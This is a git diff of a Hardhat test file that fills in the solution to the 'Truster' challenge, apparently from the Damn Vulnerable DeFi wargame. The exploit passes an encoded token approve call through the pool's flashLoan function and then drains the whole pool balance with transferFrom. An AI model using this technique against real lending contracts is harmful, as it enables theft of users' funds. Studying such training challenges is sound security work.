@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Truster', function () {
+describe.only('[Challenge] Truster', function () {
     let deployer, attacker;
 
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
@@ -28,7 +28,18 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        const iface = new ethers.utils.Interface([
+            "function approve(address spender, uint256 amount)"
+        ]);
+        const data = iface.encodeFunctionData("approve", [
+            attacker.address,
+            TOKENS_IN_POOL
+        ])
+
+        // Get approval to spend the pool's funds
+        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+        // Transfer the DVT to the attacker
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
